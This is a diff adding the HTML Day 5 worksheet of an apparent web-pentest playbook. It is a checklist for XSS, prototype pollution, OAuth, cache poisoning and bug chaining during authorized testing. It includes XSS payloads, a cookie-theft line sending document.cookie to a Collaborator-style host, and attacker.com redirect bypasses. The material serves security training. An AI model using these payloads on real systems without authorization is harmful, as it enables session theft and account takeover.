@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Day 5 Worksheet — Client-Side Deep + Close Gaps. Interactive checklist for the final day of a 5-day web pentest engagement.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff6633' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="../vulns/style.css">
+  <title>Day 5 Worksheet · Client-Side + Close Gaps · Web Pentest Playbook</title>
+</head>
+<body data-day="day5" style="--day-color: var(--accent)">
+
+<svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <symbol id="icon-shield" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
+    <symbol id="icon-target" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></symbol>
+  </defs>
+</svg>
+
+<nav class="topnav" aria-label="Primary">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2026</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html#vulns" class="nav-link">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="../index.html#day5" class="nav-link active">Worksheets</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+  </div>
+  <div class="nav-right">
+    <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="nav-link" style="font-size:0.78rem;">GitHub</a>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle color theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="content-wrap" style="padding-top:2rem">
+
+  <div class="day-page-hero">
+    <div class="day-num">Worksheet · Day 5 of 5 · Final day</div>
+    <h1>
+      <span class="day-icon-pill"><svg class="icon" aria-hidden="true"><use href="#icon-target"/></svg></span>
+      Client-Side Deep + Close Gaps
+    </h1>
+    <p>Today is about <strong>chains</strong>. Combine bugs, finish the surface map, verify everything reproduces from a fresh session, and prep the report shortlist. <em>XSS → cookie steal → IDOR. SSRF → metadata → IAM → AWS account takeover.</em></p>
+    <div class="day-progress">
+      <div class="day-progress-bar-wrap"><div class="day-progress-bar" style="width:0%"></div></div>
+      <div class="day-progress-text"><strong>0</strong> / 0 tasks · <strong>0%</strong> complete</div>
+      <div class="day-progress-saved"></div>
+    </div>
+  </div>
+
+  <section class="worksheet-section" id="open">
+    <h2><span class="ws-section-num">1</span>Open Items</h2>
+    <p class="ws-intro">Anything from Day 1's surface map you haven't actually tested yet?</p>
+    <div class="form-group">
+      <label for="t-open">Untested surface from Day 1</label>
+      <textarea id="t-open" data-key="text-open" placeholder="- Admin login at /superadmin (only test if explicitly authorized)&#10;- Webhook receiver at /webhooks/stripe&#10;- WSS endpoint /chat — origin checked but messages didn't have auth"></textarea>
+    </div>
+  </section>
+
+  <section class="worksheet-section" id="xss">
+    <h2><span class="ws-section-num">2</span>XSS (Reflected · Stored · DOM)</h2>
+    <ul class="task-list">
+      <li class="task-group-title">Reflected</li>
+      <li><input type="checkbox" data-key="check-xss-reflected"><span class="task-label">Test every reflected canary site from Day 2 with full payloads (<code>&lt;svg/onload=alert(1)&gt;</code>)</span></li>
+      <li><input type="checkbox" data-key="check-xss-context"><span class="task-label">Identify context: HTML body, attribute (single/double quote), JS string, JSON, URL</span></li>
+      <li><input type="checkbox" data-key="check-xss-csp"><span class="task-label">CSP bypass: <code>script-src 'self'</code> via JSONP, <code>nonce</code> reuse, <code>unsafe-eval</code> + AngularJS</span></li>
+      <li class="task-group-title">Stored</li>
+      <li><input type="checkbox" data-key="check-xss-stored"><span class="task-label">Plant payloads in profile / comment / name / display fields, view as another user</span></li>
+      <li><input type="checkbox" data-key="check-xss-stored-admin"><span class="task-label">Admin-viewing payloads: stored XSS that fires only when admin views user data → ATO</span></li>
+      <li class="task-group-title">DOM</li>
+      <li><input type="checkbox" data-key="check-xss-dom-hash"><span class="task-label"><code>location.hash</code> sources: <code>#&lt;img src=x onerror=alert(1)&gt;</code></span></li>
+      <li><input type="checkbox" data-key="check-xss-dom-pm"><span class="task-label">postMessage handlers: open another tab, send <code>postMessage()</code> from attacker page</span></li>
+      <li><input type="checkbox" data-key="check-xss-dom-invader"><span class="task-label">Burp DOM Invader scan for sources/sinks (free, no Pro needed)</span></li>
+      <li class="task-group-title">PoC</li>
+      <li><input type="checkbox" data-key="check-xss-cookie"><span class="task-label">Cookie theft PoC — <code>fetch('https://collab/?'+document.cookie)</code></span></li>
+      <li><input type="checkbox" data-key="check-xss-session"><span class="task-label">Session-hijack PoC: steal cookie + impersonate from a separate browser</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="proto">
+    <h2><span class="ws-section-num">3</span>Prototype Pollution</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-pp-find"><span class="task-label">Find pollution sinks: <code>Object.assign</code>, lodash <code>_.merge</code>, <code>jQuery.extend(true, ...)</code>, <code>Object.create</code></span></li>
+      <li><input type="checkbox" data-key="check-pp-test"><span class="task-label">Inject <code>__proto__</code> via JSON: <code>{"__proto__":{"polluted":true}}</code> — check <code>{}.polluted</code> in console</span></li>
+      <li><input type="checkbox" data-key="check-pp-constructor"><span class="task-label">Try <code>constructor.prototype</code> chain too</span></li>
+      <li><input type="checkbox" data-key="check-pp-gadget"><span class="task-label">Identify a gadget: <code>innerHTML</code>, <code>src</code>, <code>srcdoc</code>, <code>action</code>, <code>data</code>, server-side template default</span></li>
+      <li><input type="checkbox" data-key="check-pp-rce"><span class="task-label">Server-side proto-pollution → RCE (Node.js apps, look for <code>child_process.exec</code> defaults)</span></li>
+      <li><input type="checkbox" data-key="check-pp-burp"><span class="task-label">Burp DOM Invader Prototype Pollution scan</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="oauth-chain">
+    <h2><span class="ws-section-num">4</span>OAuth Chains</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-oauth-redirect-bypass"><span class="task-label">redirect_uri parser confusion: <code>?redirect_uri=//attacker.com</code>, <code>@attacker.com</code>, <code>#attacker.com</code></span></li>
+      <li><input type="checkbox" data-key="check-oauth-state-csrf"><span class="task-label">Account-takeover via state CSRF: drop <code>state</code>, link victim to attacker's auth code</span></li>
+      <li><input type="checkbox" data-key="check-oauth-code-leak"><span class="task-label">Code interception: any open redirect on the redirect_uri host?</span></li>
+      <li><input type="checkbox" data-key="check-oauth-token-leak"><span class="task-label">Implicit-flow token leak via Referer to a third-party resource on the post-auth page</span></li>
+      <li><input type="checkbox" data-key="check-oauth-scope-confused"><span class="task-label">Scope upgrade: ask for higher scopes than originally granted</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="cache-host">
+    <h2><span class="ws-section-num">5</span>Host Header / Cache</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-host-reset"><span class="task-label">Host-header poisoning on password-reset email link</span></li>
+      <li><input type="checkbox" data-key="check-host-headers"><span class="task-label">Try <code>X-Forwarded-Host</code>, <code>X-Original-Host</code>, <code>X-Forwarded-Server</code> alternatives</span></li>
+      <li><input type="checkbox" data-key="check-cache-unkeyed"><span class="task-label">Find unkeyed inputs: Param Miner / manual <code>X-Forwarded-Scheme</code>, <code>X-Forwarded-Host</code>, <code>X-Original-URL</code></span></li>
+      <li><input type="checkbox" data-key="check-cache-cacheable"><span class="task-label">Confirm cacheable: <code>Age:</code> header, <code>X-Cache: HIT</code>, <code>Cache-Control: public</code></span></li>
+      <li><input type="checkbox" data-key="check-cache-poison"><span class="task-label">Poison cache with XSS / open redirect via unkeyed header — affects all subsequent users</span></li>
+      <li><input type="checkbox" data-key="check-cache-deception"><span class="task-label">Cache deception: <code>/profile/x.css</code> — does it cache the dynamic profile response?</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="chains">
+    <h2><span class="ws-section-num">6</span>Chained Findings</h2>
+    <p class="ws-intro">The whole point of Day 5 — combined impact &gt; sum of parts. A 9.8-CVSS chain is one finding, not three.</p>
+    <div class="form-group">
+      <label for="t-chains">Chains in progress</label>
+      <textarea id="t-chains" data-key="text-chains" placeholder="### Chain 1: Stored XSS → cookie steal → IDOR → ATO&#10;1. Plant XSS in profile bio (Day 3 finding)&#10;2. Admin views user list, payload fires&#10;3. Admin's session cookie exfil'd to Collaborator&#10;4. Reuse cookie + IDOR /api/users/{id} → full account takeover of any user&#10;Final CVSS: 9.8&#10;&#10;### Chain 2: SSRF → IAM → AWS account takeover&#10;..."></textarea>
+    </div>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-chain-xss-csrf"><span class="task-label">Try XSS + CSRF chain (XSS triggers state-changing request)</span></li>
+      <li><input type="checkbox" data-key="check-chain-ssrf-rce"><span class="task-label">Try SSRF + RCE chain (metadata IAM → S3 / Lambda / EC2 → RCE)</span></li>
+      <li><input type="checkbox" data-key="check-chain-idor-role"><span class="task-label">Try IDOR + role-escalation (modify another user's role to admin)</span></li>
+      <li><input type="checkbox" data-key="check-chain-pp-gadget"><span class="task-label">Try Prototype Pollution + gadget (PP makes a sink reachable)</span></li>
+      <li><input type="checkbox" data-key="check-chain-host-reset"><span class="task-label">Try Host-header + password-reset (poison link → ATO any user)</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="repro">
+    <h2><span class="ws-section-num">7</span>Reproducibility Verification</h2>
+    <p class="ws-intro">Every finding must be reproducible from a clean state, otherwise it doesn't ship.</p>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-repro-fresh"><span class="task-label">Fresh browser profile (or incognito) — clear cookies, localStorage, cache</span></li>
+      <li><input type="checkbox" data-key="check-repro-day4"><span class="task-label">Re-run every Day-4 POC from scratch — does it still fire?</span></li>
+      <li><input type="checkbox" data-key="check-repro-chain"><span class="task-label">Re-run every Day-5 chain end-to-end</span></li>
+      <li><input type="checkbox" data-key="check-repro-edge"><span class="task-label">Edge cases tested: different browsers, different roles, different tenants</span></li>
+      <li><input type="checkbox" data-key="check-repro-screenshot"><span class="task-label">Fresh screenshots captured for the report</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="report">
+    <h2><span class="ws-section-num">8</span>Final Report Shortlist</h2>
+    <div class="form-group">
+      <label for="t-final">All findings (one line each, severity-sorted)</label>
+      <textarea id="t-final" data-key="text-final" placeholder="CRITICAL  Stored XSS + IDOR ATO chain (Days 3 + 5)&#10;CRITICAL  SQLi at /search?q= — full DB read (Day 4)&#10;CRITICAL  CMDi at /api/ping?host= — RCE (Day 4)&#10;HIGH      SSRF at /preview?url= — internal portscan (Day 4)&#10;HIGH      Reflected XSS at /search?q= (Day 5)&#10;MEDIUM    Cookie missing Secure flag (Day 1)&#10;MEDIUM    Username enumeration via reset flow (Day 2)&#10;LOW       Missing HSTS (Day 1)"></textarea>
+    </div>
+    <div class="form-group">
+      <label for="t-not-issues">Tested &amp; not vulnerable (also worth noting in the report)</label>
+      <textarea id="t-not-issues" data-key="text-not-issues" placeholder="- CSRF protection in place on all state-changing routes&#10;- Path traversal blocked at /import (validated)&#10;- WebSocket Origin validation working"></textarea>
+    </div>
+  </section>
+
+  <section class="worksheet-section" id="eod">
+    <h2><span class="ws-section-num">✓</span>End of Day &amp; Engagement</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-eod-all-repro"><span class="task-label">Every finding reproducible from a fresh session</span></li>
+      <li><input type="checkbox" data-key="check-eod-chains"><span class="task-label">Chained findings written as single tickets with the full attack narrative</span></li>
+      <li><input type="checkbox" data-key="check-eod-cleanup"><span class="task-label">Clean up: any payloads planted during testing removed (deleted XSS in profile, etc.)</span></li>
+      <li><input type="checkbox" data-key="check-eod-export"><span class="task-label">Export all 5 day worksheets as text and archive with the engagement notes</span></li>
+      <li><input type="checkbox" data-key="check-eod-report"><span class="task-label">Final report draft started — exec summary + findings table</span></li>
+      <li><input type="checkbox" data-key="check-eod-iron"><span class="task-label"><strong>Iron Rule:</strong> chains are written as one finding, not three; impact statement reflects the WORST credible outcome</span></li>
+    </ul>
+
+    <div class="day-actions">
+      <button id="day-export" type="button">📄 Export as text</button>
+      <button id="day-reset" type="button" class="danger">↺ Reset Day 5 progress</button>
+    </div>
+  </section>
+
+  <nav class="day-nav-buttons" aria-label="Day navigation">
+    <a href="day4.html" class="prev">
+      <span class="nav-label">← Previous</span>
+      <span class="nav-title">Day 4 · Server-Side</span>
+    </a>
+    <a href="../index.html" class="next">
+      <span class="nav-label">Engagement done →</span>
+      <span class="nav-title">Back to overview</span>
+    </a>
+  </nav>
+
+</div>
+
+<footer class="home-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-brand-link">
+          <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+          <span class="footer-brand-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Worksheets</div>
+        <a href="day1.html">Day 1 · Recon</a>
+        <a href="day2.html">Day 2 · Auth + Probes</a>
+        <a href="day3.html">Day 3 · File / Client</a>
+        <a href="day4.html">Day 4 · Server-Side</a>
+        <a href="day5.html">Day 5 · Client + Close</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html">5-Day Playbook</a>
+        <a href="../index.html">All Vulnerabilities</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom-row">
+      <span>© 2026 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by Tomer Hadad</span>
+    </div>
+  </div>
+</footer>
+
+<script src="dayform.js"></script>
+<script>
+  (function(){
+    var t = localStorage.getItem('theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+    var btn = document.getElementById('theme-toggle');
+    if(btn){
+      btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+      btn.addEventListener('click', function(){
+        var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', n);
+        localStorage.setItem('theme', n);
+        btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+      });
+    }
+  })();
+</script>
+
+</body>
+</html>
